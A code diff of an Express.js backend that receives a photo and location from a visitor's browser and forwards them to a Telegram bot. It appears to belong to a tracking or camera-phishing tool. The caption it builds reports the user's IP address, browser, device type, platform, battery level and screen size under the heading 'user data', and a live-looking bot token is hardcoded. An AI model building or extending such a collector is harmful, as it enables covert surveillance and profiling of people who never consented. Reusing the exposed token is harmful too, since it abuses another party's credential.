@@ -19,7 +19,7 @@ app.use(express.json());
 app.use(cors());
 
 app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
-  const { chat_id, latitude, longitude } = req.body;
+  const { chat_id, batteryLevel } = req.body;
   const photo = req.file;
 
   if (!photo) {
@@ -29,7 +29,7 @@ app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
   try {
     const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;
 
-    const apiUrl = `https://api.telegram.org/bot6725080038:AAGg7RFm3R6DDkVaYPnv-lST7HeA-jI_mzI/sendPhoto`;
+    const apiUrl = `https://api.telegram.org/bot6725080038:AAGg7RFm3R6DDkVaYPnv-lST7HeA-jI_mzI/sendPhoto`; // Замените <YOUR_BOT_TOKEN> на ваш токен бота
 
     const formData = new FormData();
     formData.append('chat_id', chat_id);
@@ -39,14 +39,13 @@ app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
       knownLength: photo.size,
     });
 
-    const deviceInfo = JSON.parse(req.body.deviceInfo); // Извлекаем deviceInfo из req.body
     const caption = `Данные о пользователе:\n\n` +
-                    `🔋 Уровень батареи: In development\n` +
-                    `📍 IP Address: ${userIP}\n` +
-                    `🌐 Browser: ${deviceInfo.userAgent}\n` +
-                    `📱 Тип устройства: ${deviceInfo.deviceType}\n` +
-                    `🖥 Платформа: ${deviceInfo.platform}\n` +
-                    `📏 Разрешение экрана: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}`;
+                    `🔋 Уровень батареи: ${batteryLevel}\n\n` +
+                    `📍 IP Address: ${userIP}\n\n` +
+                    `🌐 Browser: ${req.headers['user-agent']}\n\n` +
+                    `📱 Тип устройства: ${req.headers['user-agent'].includes('Mobile') ? 'Mobile Device' : 'Desktop Device'}\n\n` +
+                    `🖥 Платформа: ${req.headers['user-agent'].includes('Windows') ? 'Windows' : 'Other'}\n\n` +
+                    `📏 Разрешение экрана: ${req.headers['screen-width']}x${req.headers['screen-height']}`;
 
     formData.append('caption', caption);
 
@@ -63,6 +62,7 @@ app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
     res.status(500).send('Error sending photo to Telegram');
   }
 });
+
 
 app.post('/sendLocationToTelegram', async (req, res) => {
   const { chat_id, latitude, longitude } = req.body;
